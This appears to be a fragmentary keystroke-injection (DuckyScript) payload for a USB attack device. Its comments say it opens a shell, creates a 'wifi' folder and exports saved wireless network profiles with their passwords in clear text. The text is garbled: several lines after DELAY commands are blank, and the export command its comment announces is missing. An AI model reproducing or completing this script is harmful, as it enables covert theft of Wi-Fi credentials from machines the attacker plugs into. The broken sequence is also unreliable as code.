DELAY 5000

DELAY 100

DELAY 1000

DELAY 100
ENTER
DELAY 2000

DELAY 300
ENTER
DELAY 100
REM make a directory to export the network profiles to
STRING mkdir wifi

ENTER

REM this command will export the profiles with the passwords in clear text

ENTER

STRING copy *.xml wifi.txt

ENTER

ENTER
